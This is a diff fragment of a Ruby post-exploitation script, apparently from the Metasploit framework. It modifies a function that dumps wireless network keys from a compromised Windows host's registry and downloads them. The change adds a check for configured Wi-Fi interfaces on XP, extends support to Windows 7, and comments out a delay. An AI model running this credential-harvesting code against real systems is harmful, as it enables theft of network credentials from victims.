@@ -526,7 +526,12 @@ def dumpwlankeys(pathoflogs,filename)
 	trgtos = info['OS']
 	if trgtos =~ /(XP)/
 		key = xpwlan
-	elsif trgtos =~ /(Vista)/
+		present = false
+		if reg_enumkeys("HKLM\\Software\\Microsoft\\WZCSVC\\Parameters").length == 0
+			print_status("\tNo Wireless interfaces are configured on this host!")
+			return
+		end
+	elsif trgtos =~ /(Vista|7)/
 		key = vswlan
 	end
 	begin
@@ -554,7 +559,7 @@ def dumpwlankeys(pathoflogs,filename)
 	begin
 		print_status("\tDownloading wlan#{filename}.cab to -> #{pathoflogs}/wlan#{filename}.cab")
 		@client.fs.file.download_file("#{pathoflogs}/wlan#{filename}.cab", "#{windir}\\wlan#{filename}.cab")
-		sleep(5)
+		#sleep(5)
 	rescue ::Exception => e
 		print_status("Error Downloading Registry keys #{e.class} #{e}")
 	end
